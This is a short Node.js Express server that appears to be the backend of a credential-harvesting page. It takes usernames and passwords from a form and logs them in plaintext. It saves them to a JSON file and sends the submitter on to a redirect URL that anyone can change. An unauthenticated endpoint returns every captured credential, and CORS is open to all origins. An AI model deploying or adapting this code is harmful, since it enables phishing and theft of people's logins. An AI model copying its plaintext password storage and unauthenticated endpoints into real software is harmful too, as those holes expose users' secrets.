const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors()); // Allow all origins for simplicity
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve frontend files

// API route to handle form submissions
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;

  if (username && password) {
    console.log('Data received:', { username, password });

    // Simulate saving data to a file (replace with database in production)
    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8') || '[]');
    submissions.push({ username, password, timestamp: new Date().toISOString() });
    fs.writeFileSync('submissions.json', JSON.stringify(submissions, null, 2));

    // Read the redirect URL from config.json
    const config = JSON.parse(fs.readFileSync('config.json', 'utf8') || '{}');
    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl || '/thankyou.html' });
  } else {
    res.status(400).json({ message: 'Invalid input' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
app.get('/api/submissions', (req, res) => {
  try {
    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8') || '[]');
    res.json(submissions);
  } catch (error) {
    console.error('Error reading submissions.json:', error);
    res.status(500).json({ message: 'Failed to fetch submissions' });
  }
});
app.post('/api/config/redirect', (req, res) => {
  const { redirectUrl } = req.body;

  if (redirectUrl) {
    try {
      fs.writeFileSync('config.json', JSON.stringify({ redirectUrl }));
      console.log('Redirect URL updated:', redirectUrl);
      res.json({ message: 'Redirect URL updated successfully' });
    } catch (error) {
      console.error('Error writing to config.json:', error);
      res.status(500).json({ message: 'Failed to update redirect URL' });
    }
  } else {
    res.status(400).json({ message: 'Invalid URL' });
  }
});